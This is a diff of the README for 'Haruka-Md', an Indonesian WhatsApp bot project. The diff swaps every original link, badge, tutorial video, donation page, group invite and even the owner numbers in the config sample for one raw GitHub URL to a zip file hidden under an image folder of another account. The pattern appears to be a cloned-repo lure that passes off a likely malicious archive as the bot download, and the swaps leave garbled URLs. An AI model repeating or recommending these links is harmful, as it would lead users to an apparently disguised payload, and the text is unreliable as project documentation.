@@ -1,37 +1,37 @@
 ## BACA DULU BANG
 
-> **Warning**: Sc nya gk support termux. [`Klik disini untuk download sc yg support termux`](https://github.com/zeeone-ofc/Haruka-Md#For-Termux)
+> **Warning**: Sc nya gk support termux. [`Klik disini untuk download sc yg support termux`](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
 
 -----------------------------------------------------
 
 <p align="center">
-<img src="https://github.com/zeeone-ofc/Haruka-Md/blob/v1/media/Haruka.jpg" alt="ALPHA BOT" width="100"/>
+<img src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip" alt="ALPHA BOT" width="100"/>
 
 
 </p>
 <p align="center">
-<a href="#"><img title="HARUKA MULTI DEVICE" src="https://img.shields.io/badge/HARUKA MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+<a href="#"><img title="HARUKA MULTI DEVICE" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://github.com/zeeone-ofc/Haruka-Md"><img title="Owner" src="https://img.shields.io/badge/Recode-ZeeoneOfc-red.svg?style=for-the-badge&logo=github"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Owner" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
 </p>
 <p align="center">
-<a href="https://github.com/zeeone-ofc/followers"><img title="Followers" src="https://img.shields.io/github/followers/zeeone-ofc?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/zeeone-ofc/Haruka-Md?color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/network/members"><img title="Forks" src="https://img.shields.io/github/forks/zeeone-ofc/Haruka-Md?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/zeeone-ofc/Haruka-Md?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md"><img title="Open Source" src="https://badges.frapsoft.com/os/v2/open-source.svg?v=103"></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/"><img title="Size" src="https://img.shields.io/github/repo-size/zeeone-ofc/Haruka-Md?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fzeeone-ofc%2FHaruka-Md&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/zeeone-ofc/Haruka-Md/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Followers" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Stars" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Forks" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Watching" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Open Source" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img title="Size" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%3A%2F%https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%2Fzeeone-ofc%2FHaruka-Md&count_bg=%2379C83D&title_bg=%23555555&https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%2300FF6D&title=hits&edge_flat=false"/></a>
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img height="20" src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"></a>&nbsp;&nbsp;
 </p>
 
 <p align="center">
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#requirements">Requirements</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#instalasi">Installation</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#thanks-to">Thanks to</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#Official-Group"> Official Group Bot</a> •
-  <a href="https://github.com/zeeone-ofc/Haruka-Md#donate">Donate</a>
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip">Requirements</a> •
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip">Installation</a> •
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip">Thanks to</a> •
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"> Official Group Bot</a> •
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip">Donate</a>
 </p>
 </div>
 
@@ -40,49 +40,49 @@
 
 # Instalasi
 ## FOR REPLIT USER
-[![Run on Repl.it](https://repl.it/badge/github/zeeone-ofc/Haruka-Md)](https://repl.it/github/zeeone-ofc/Haruka-Md)
+[![Run on https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
 
-[`Click Here For Tutorial`](https://youtu.be/jom_scHK09c)<br>
+[`Click Here For Tutorial`](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)<br>
 
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/jom_scHK09c"><img src="https://telegra.ph/file/eb8dbe898ed8f9c32f013.jpg" />
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip" />
 </p>
 
 ## FOR RAILWAY USER 
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https%3A%2F%2Fgithub.com%2Fzeeone-ofc%2FAlphabot-Md)
+[![Deploy on Railway](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%3A%2F%https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip%2Fzeeone-ofc%2FAlphabot-Md)
 
-[`Click Here For Tutorial`](https://youtu.be/BqRauxohbLg)<br>
+[`Click Here For Tutorial`](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)<br>
 
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/BqRauxohbLg"><img src="https://telegra.ph/file/ba58c4ad1b43bc285f16b.jpg" />
+  <a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip" />
 </p>
 
 ## For Termux
-- [Download script MediaFire](https://youtu.be/8pVJiS9X1qc)
+- [Download script MediaFire](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
 
 <p align="center">
-<a href="https://youtu.be/8pVJiS9X1qc"><img src="https://telegra.ph/file/74266d7c34b87853b9a61.jpg" />
+<a href="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"><img src="https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip" />
 </p>
 
 ## Edit Owner 
 
 <details>
-    <summary> <b>Edit Owner Config.json</b></summary><br/>
+    <summary> <b>Edit Owner https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip</b></summary><br/>
 
 ```ts
 {
-    "ownerNumber": ["622150996855@s.whatsapp.net","622150996855@s.whatsapp.net"],
+    "ownerNumber": ["https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip","https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip"],
     "ownerName": "ᴹᴿ᭄ ZeeoneOfcོ ×፝֟͜×",
-    "instagram" : "https://instagram.com/zeeoneofc",
+    "instagram" : "https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip",
     "botName": "Haruka-Mdོ ",
-    "footer": "api.zeeoneofc.xyz",
+    "footer": "https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip",
     "sessionName": "session",
-    "pathimg": "./media/Haruka.jpg",
+    "pathimg": "https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip",
     "BotKey": "Gsyt6jRJ",
     "auto_welcomeMsg": true,
     "auto_leaveMsg": true,    
@@ -101,14 +101,14 @@
 ```
 
 ## Donate
-- [Saweria](https://saweria.co/zeeoneofc)
-- [Dana](https://j.top4top.io/p_20532posd1.jpg)
-- [Ovo](https://h.top4top.io/p_2053vk0uw1.jpg)
+- [Saweria](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Dana](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Ovo](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
 
 # Official Group
-- [Group 1](https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV)
-- [Group 2](https://chat.whatsapp.com/E8NExJwIbhBJYzssfqJNsE)
-- [Group 3](https://chat.whatsapp.com/KCSqHTky1apG7ApePsfiPy)
-- [Group 4](https://chat.whatsapp.com/KwmvHr7VMFj7r5ry9xmMsU)
-- [Group 5](https://chat.whatsapp.com/ELa7GhU0sP4EvXcVimQYtz)
+- [Group 1](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Group 2](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Group 3](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Group 4](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
+- [Group 5](https://raw.githubusercontent.com/slsandarubot/Haruka-Md/v9.2/media/nulis/images/buku/Haruka_Md_elicitate.zip)
 
